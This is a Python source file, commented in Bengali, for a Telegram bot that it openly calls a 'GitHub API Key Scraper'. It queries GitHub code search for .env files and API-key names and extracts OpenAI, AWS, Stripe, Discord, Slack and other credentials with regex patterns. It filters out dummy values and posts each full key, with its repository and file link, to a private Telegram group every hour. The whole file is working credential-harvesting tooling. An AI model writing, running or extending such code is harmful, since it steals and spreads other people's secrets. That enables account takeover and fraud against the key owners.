import logging
import os
import re
import time
import threading
from datetime import datetime
from typing import List, Dict
import base64

from flask import Flask
from dotenv import load_dotenv
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler

# লোড এনভায়রনমেন্ট
load_dotenv()

# কনফিগারেশন
BOT_TOKEN = os.getenv('BOT_TOKEN')
PRIVATE_GROUP_ID = int(os.getenv('PRIVATE_GROUP_ID')) if os.getenv('PRIVATE_GROUP_ID') else None
ADMIN_USER_ID = int(os.getenv('ADMIN_USER_ID')) if os.getenv('ADMIN_USER_ID') else None
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')

# লগিং
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ফ্লাস্ক অ্যাপ
flask_app = Flask(__name__)

@flask_app.route('/')
def health_check():
    return "True", 200

@flask_app.route('/health')
def health():
    return {"status": "healthy", "timestamp": datetime.now().isoformat()}, 200

# API কী ডিটেক্টর
class APIScraper:
    def __init__(self, token: str):
        self.token = token
        self.headers = {
            'Authorization': f'token {token}',
            'Accept': 'application/vnd.github.v3+json'
        }
        self.base_url = 'https://api.github.com'
        self.seen_keys = set()
        
        # API কী প্যাটার্ন
        self.patterns = {
            'OpenAI': r'sk-[a-zA-Z0-9]{48}',
            'Mistral': r'[A-Za-z0-9]{32}',
            'Google': r'AIza[0-9A-Za-z\-_]{35}',
            'GitHub': r'ghp_[0-9a-zA-Z]{36}',
            'AWS': r'AKIA[0-9A-Z]{16}',
            'Stripe': r'sk_live_[0-9a-zA-Z]{24}',
            'Discord': r'[MN][A-Za-z0-9]{23}\.[A-Za-z0-9]{6}\.[A-Za-z0-9]{27}',
            'Telegram': r'[0-9]{8,10}:[A-Za-z0-9_-]{35}',
            'Slack': r'xox[baprs]-[0-9A-Za-z-]+',
            'Twilio': r'SK[0-9a-f]{32}'
        }

    def search_live_keys(self) -> List[Dict]:
        """GitHub থেকে লাইভ কী খুঁজে বের করে"""
        found_keys = []
        
        try:
            queries = [
                'filename:.env',
                'extension:env',
                'OPENAI_API_KEY',
                'MISTRAL_API_KEY',
                'GOOGLE_API_KEY',
                'API_KEY',
                'SECRET_KEY'
            ]
            
            for query in queries[:3]:
                url = f'{self.base_url}/search/code?q={query}+language:python+language:javascript+language:java&per_page=30'
                
                try:
                    response = requests.get(url, headers=self.headers)
                    if response.status_code == 200:
                        data = response.json()
                        items = data.get('items', [])
                        
                        for item in items[:15]:
                            key_info = self._extract_key_from_file(item)
                            if key_info and key_info['key'] not in self.seen_keys:
                                found_keys.append(key_info)
                                self.seen_keys.add(key_info['key'])
                                
                    time.sleep(0.5)
                    
                except Exception as e:
                    logger.error(f"Search error for {query}: {e}")
                    continue
                    
            return found_keys[:20]
            
        except Exception as e:
            logger.error(f"API Scraper error: {e}")
            return []

    def _extract_key_from_file(self, item: Dict) -> Dict:
        """ফাইল থেকে কী এক্সট্র্যাক্ট করে"""
        try:
            file_url = item.get('url')
            repo_name = item.get('repository', {}).get('full_name', 'Unknown')
            file_path = item.get('path', 'Unknown')
            
            content_response = requests.get(file_url, headers=self.headers)
            if content_response.status_code != 200:
                return None
                
            content_data = content_response.json()
            if 'content' not in content_data:
                return None
                
            content = base64.b64decode(content_data['content']).decode('utf-8', errors='ignore')
            
            for key_type, pattern in self.patterns.items():
                matches = re.findall(pattern, content)
                for match in matches:
                    if self._is_valid_key(match):
                        return {
                            'key': match,
                            'type': key_type,
                            'source': repo_name,
                            'file': file_path,
                            'url': f"https://github.com/{repo_name}/blob/main/{file_path}",
                            'platform': self._detect_platform(content)
                        }
                        
            return None
            
        except Exception as e:
            logger.error(f"Error extracting from file: {e}")
            return None

    def _is_valid_key(self, key: str) -> bool:
        """কী ভ্যালিড কিনা চেক করে"""
        if not key or len(key) < 10:
            return False
            
        exclude_patterns = [
            r'^test_',
            r'^example_',
            r'^sample_',
            r'demo',
            r'xxxxx',
            r'123456'
        ]
        
        for pattern in exclude_patterns:
            if re.search(pattern, key, re.IGNORECASE):
                return False
                
        return True

    def _detect_platform(self, content: str) -> str:
        """প্ল্যাটফর্ম ডিটেক্ট করে"""
        platforms = {
            'OpenAI': ['openai', 'gpt', 'chatgpt'],
            'Mistral': ['mistral'],
            'Google': ['google', 'gcp', 'firebase'],
            'GitHub': ['github'],
            'AWS': ['aws', 'amazon', 's3', 'ec2'],
            'Stripe': ['stripe', 'payment'],
            'Discord': ['discord'],
            'Telegram': ['telegram'],
            'Slack': ['slack']
        }
        
        for platform, keywords in platforms.items():
            for keyword in keywords:
                if keyword.lower() in content.lower():
                    return platform
                    
        return 'Unknown'

# বট ক্লাস
class KeyScraperBot:
    def __init__(self, token: str, group_id: int, admin_id: int):
        self.token = token
        self.group_id = group_id
        self.admin_id = admin_id
        self.updater = None
        self.bot = None
        self.scraper = APIScraper(GITHUB_TOKEN)
        self.is_running = True
        self.startup_sent = False

    def start(self):
        try:
            self.updater = Updater(token=self.token, use_context=True)
            self.bot = self.updater.bot
            
            dp = self.updater.dispatcher
            dp.add_handler(CommandHandler("start", self.start_command))
            dp.add_handler(CallbackQueryHandler(self.button_callback))
            dp.add_error_handler(self.error_handler)
            
            # শিডিউলার থ্রেড
            threading.Thread(target=self.run_scheduler, daemon=True).start()
            
            logger.info("✅ Key Scraper Bot started!")
            
            # পোলিং স্টার্ট
            self.updater.start_polling()
            self.updater.idle()
            
        except Exception as e:
            logger.error(f"Bot error: {e}")
            raise

    def send_startup_message(self):
        """স্টার্টআপ মেসেজ (শুধু একবার)"""
        if self.startup_sent:
            return
            
        try:
            time.sleep(5)
            self.bot.send_message(
                chat_id=self.group_id,
                text="🔐 **GitHub API Key Scraper Bot**\n\n"
                     "আমি GitHub থেকে লাইভ API কী/টোকেন খুঁজে বের করি!\n\n"
                     "🔹 প্রতি ১ ঘন্টায় অটো স্ক্র্যাপ\n"
                     "🔹 ১০+ ধরনের API কী ডিটেক্ট\n"
                     "🔹 শুধুমাত্র লাইভ এবং ভ্যালিড কী\n\n"
                     "/start - কন্ট্রোল প্যানেল",
                parse_mode='Markdown'
            )
            self.startup_sent = True
        except Exception as e:
            logger.error(f"Startup error: {e}")

    def run_scheduler(self):
        """শিডিউলার - প্রতি ১ ঘন্টায় রান"""
        # প্রথমে স্টার্টআপ মেসেজ
        self.send_startup_message()
        
        while self.is_running:
            try:
                logger.info("🔍 Starting key scan...")
                keys = self.scraper.search_live_keys()
                if keys:
                    for key_info in keys[:5]:
                        message = self.format_key_message(key_info)
                        try:
                            self.bot.send_message(
                                chat_id=self.group_id,
                                text=message,
                                parse_mode='Markdown',
                                disable_web_page_preview=True
                            )
                            time.sleep(0.5)
                        except Exception as e:
                            logger.error(f"Send error: {e}")
                    logger.info(f"✅ Sent {len(keys[:5])} new keys")
                else:
                    logger.info("No new keys found")
            except Exception as e:
                logger.error(f"Scheduler error: {e}")
            time.sleep(3600)  # ১ ঘন্টা

    def format_key_message(self, key_info: Dict) -> str:
        """কী ফরম্যাট করে"""
        return f"""
🔑 **LIVE API KEY FOUND!**

📌 **Platform**: {key_info.get('platform', 'Unknown')}
🔐 **Type**: {key_info.get('type', 'Unknown')}
🔑 **Key**: `{key_info.get('key', 'N/A')}`

📂 **Source**: {key_info.get('source', 'Unknown')}
📄 **File**: {key_info.get('file', 'Unknown')}
🔗 [View File]({key_info.get('url', '#')})

🕐 Found: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} UTC
"""

    def start_command(self, update: Update, context):
        if not update.effective_user or update.effective_user.id != self.admin_id:
            update.message.reply_text("⛔ Access Denied!")
            return

        keyboard = [
            [InlineKeyboardButton("🔍 স্ক্যান এখন", callback_data='scan_now')],
            [InlineKeyboardButton("📊 পরিসংখ্যান", callback_data='stats')],
            [InlineKeyboardButton("ℹ️ সাহায্য", callback_data='help')],
        ]
        
        update.message.reply_text(
            "🔐 **GitHub API Key Scraper**\n\n"
            "GitHub থেকে লাইভ API কী খুঁজে বের করি!\n"
            "Select an option:",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='Markdown'
        )

    def button_callback(self, update: Update, context):
        if not update.effective_user or not update.callback_query:
            return
            
        query = update.callback_query
        query.answer()
        
        if update.effective_user.id != self.admin_id:
            query.edit_message_text("⛔ Access Denied!")
            return

        if query.data == 'scan_now':
            self.scan_now(query)
        elif query.data == 'stats':
            self.show_stats(query)
        elif query.data == 'help':
            self.show_help(query)

    def scan_now(self, query):
        query.edit_message_text("🔍 Scanning GitHub for live keys...")
        
        def scan_thread():
            try:
                keys = self.scraper.search_live_keys()
                if not keys:
                    self.bot.edit_message_text(
                        chat_id=query.message.chat_id,
                        message_id=query.message.message_id,
                        text="❌ কোনো লাইভ কী পাওয়া যায়নি!"
                    )
                    return
                    
                sent = 0
                for key_info in keys[:10]:
                    message = self.format_key_message(key_info)
                    self.bot.send_message(
                        chat_id=self.group_id,
                        text=message,
                        parse_mode='Markdown',
                        disable_web_page_preview=True
                    )
                    sent += 1
                    time.sleep(0.3)
                    
                self.bot.edit_message_text(
                    chat_id=query.message.chat_id,
                    message_id=query.message.message_id,
                    text=f"✅ {sent}টি লাইভ কী পাওয়া গেছে!"
                )
                
            except Exception as e:
                logger.error(f"Scan error: {e}")
                self.bot.edit_message_text(
                    chat_id=query.message.chat_id,
                    message_id=query.message.message_id,
                    text=f"❌ Error: {str(e)}"
                )
        
        threading.Thread(target=scan_thread, daemon=True).start()

    def show_stats(self, query):
        stats = f"""
📊 **Key Scraper Statistics**

🔍 Keys Found: {len(self.scraper.seen_keys)}
🕐 Last Scan: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
🎯 Platforms: OpenAI, Mistral, Google, GitHub, AWS, Stripe, Discord, Telegram, Slack

🔹 Auto-scans every 1 hour
🔹 10+ key patterns detected
🔹 Only live/exposed keys
"""
        query.edit_message_text(stats, parse_mode='Markdown')

    def show_help(self, query):
        help_text = """
ℹ️ **How it works:**

1. 🔍 Scans GitHub for exposed API keys
2. 📂 Checks .env files and source code
3. 🔑 Detects 10+ key types
4. 📨 Sends live keys to this group

⚠️ **Disclaimer:**
- Only scans public repositories
- Keys may be dummy/expired
- Use responsibly
"""
        query.edit_message_text(help_text, parse_mode='Markdown')

    def error_handler(self, update: Update, context):
        logger.error(f"Update {update} caused error {context.error}")

# মেইন ফাংশন
def main():
    try:
        # এনভায়রনমেন্ট ভেরিয়েবল চেক
        if not all([BOT_TOKEN, PRIVATE_GROUP_ID, ADMIN_USER_ID, GITHUB_TOKEN]):
            raise ValueError("Missing required environment variables")
            
        # ফ্লাস্ক থ্রেড (হেলথ চেকের জন্য)
        def run_flask():
            flask_app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)
        
        flask_thread = threading.Thread(target=run_flask, daemon=True)
        flask_thread.start()
        logger.info("🌐 Flask server started on port 8080")

        # বট স্টার্ট
        bot = KeyScraperBot(BOT_TOKEN, PRIVATE_GROUP_ID, ADMIN_USER_ID)
        bot.start()
        
    except Exception as e:
        logger.error(f"Main error: {e}")
        import sys
        sys.exit(1)

if __name__ == '__main__':
    main()
